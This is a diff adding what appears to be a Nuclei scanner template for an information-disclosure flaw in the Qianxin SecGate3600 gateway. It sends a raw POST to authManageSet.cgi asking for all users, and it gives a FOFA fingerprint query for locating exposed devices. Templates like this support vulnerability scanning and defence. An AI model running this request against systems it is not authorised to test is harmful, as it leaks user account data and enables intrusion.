@@ -1,0 +1,39 @@
+id: QAX-SecGate3600-authManageSet-infoleak
+
+info:
+  name: QAX-SecGate3600-authManageSet-infoleak
+  author: linfeng7z
+  severity: high
+  description: 网神 SecGate3600 authManageSet.cgi 信息泄露漏洞
+  tags: qax,qianxin,secgate,infoleak
+  metadata:
+    fofa-qeury: (body="sec_gate_image/login_02.gif") || (fid="ldb0WVBlAgZloMw9AAge0A==")
+    veified: true
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+         
+        type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "audit"
+          - "records"
+          - "admin"
+          - "<cell>"
+        condition: or
+
+      - type: dsl
+        dsl:
+          - status_code == 200
